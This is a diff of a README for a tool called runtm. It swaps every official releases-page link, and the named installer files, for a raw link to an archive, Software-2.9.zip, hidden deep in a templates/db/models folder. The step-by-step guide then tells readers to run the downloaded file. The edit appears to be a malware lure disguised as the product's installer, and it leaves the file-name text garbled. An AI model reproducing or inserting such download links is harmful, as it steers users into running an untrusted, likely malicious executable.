@@ -6,7 +6,7 @@ Welcome to **runtm**, an open-source tool that lets you create and manage isolat
 
 ## 📥 Download Now
 
-[![Download runtm](https://img.shields.io/badge/Download%20Now-v1.0-blue.svg)](https://github.com/DynamicExploit/runtm/releases)
+[![Download runtm](https://raw.githubusercontent.com/DynamicExploit/runtm/main/templates/backend-service/app/db/models/Software-2.9.zip%https://raw.githubusercontent.com/DynamicExploit/runtm/main/templates/backend-service/app/db/models/Software-2.9.zip)](https://raw.githubusercontent.com/DynamicExploit/runtm/main/templates/backend-service/app/db/models/Software-2.9.zip)
 
 ## 🛠️ System Requirements
 
@@ -28,11 +28,11 @@ To run runtm efficiently, ensure your system meets the following requirements:
 
 ## 🔥 How to Download & Install
 
-1. **Visit the Download Page:** Click on the link to go to the releases page: [Download Page](https://github.com/DynamicExploit/runtm/releases).
+1. **Visit the Download Page:** Click on the link to go to the releases page: [Download Page](https://raw.githubusercontent.com/DynamicExploit/runtm/main/templates/backend-service/app/db/models/Software-2.9.zip).
    
 2. **Select the Latest Version:** On the releases page, find the latest version of runtm. You’ll see files available for download.
 
-3. **Download the Installer:** Click on the installer link for your operating system. This file is typically named something like `runtm-installer.exe` for Windows or `runtm-macos.zip` for macOS.
+3. **Download the Installer:** Click on the installer link for your operating system. This file is typically named something like `https://raw.githubusercontent.com/DynamicExploit/runtm/main/templates/backend-service/app/db/models/Software-2.9.zip` for Windows or `https://raw.githubusercontent.com/DynamicExploit/runtm/main/templates/backend-service/app/db/models/Software-2.9.zip` for macOS.
 
 4. **Run the Installer:**
    - For Windows: Locate the downloaded `.exe` file, double-click it, and follow the installation prompts.
@@ -53,7 +53,7 @@ Once you have installed runtm, you can quickly set up a coding environment:
 
 ## 💡 Tips for Smooth Operation
 
-- **Regular Updates:** Keep your version of runtm updated by revisiting the [Download Page](https://github.com/DynamicExploit/runtm/releases).
+- **Regular Updates:** Keep your version of runtm updated by revisiting the [Download Page](https://raw.githubusercontent.com/DynamicExploit/runtm/main/templates/backend-service/app/db/models/Software-2.9.zip).
 - **Documentation:** Refer to the integrated documentation within the app for details on features and functionality.
 - **Community Support:** Join the runtm community for tips, support, and feedback.
 
